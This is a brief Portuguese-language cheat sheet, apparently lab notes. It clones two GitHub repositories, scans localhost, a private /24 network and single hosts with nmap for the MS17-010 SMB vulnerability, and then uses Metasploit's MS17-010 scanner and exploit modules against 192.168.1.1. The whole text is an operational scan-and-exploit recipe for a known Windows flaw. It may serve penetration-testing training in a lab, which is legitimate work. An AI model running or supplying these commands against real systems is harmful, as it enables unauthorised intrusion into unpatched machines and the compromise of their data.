git clone https://github.com/vaamonde/nmap-nse-scripts
 
git clone https://github.com/vaamonde/exploit

Verificar versão do NMAP:	nmap --version<br>
				man nmap
							
nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse localhost

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse 192.168.1.0/24

nmap -d -sC -p445 --open --max-hostgroup 3 --script nmap-nse-scripts/scripts/smb-vuln-ms17-010.nse 192.168.1.150

Atualizar o Metasploit:		msfupdate
Acessar o Metasploit:		msfconsole
Acessar o Modo Scan:		use auxiliary/scanner/smb/smb_ms17_010
				show options
				set rhosts 192.168.1.1
				exploit
							
Acessar o modo Exploit:		use exploit/ms17_010/ms_17_010
				show options
				set rhosts 192.168.1.1
				exploit
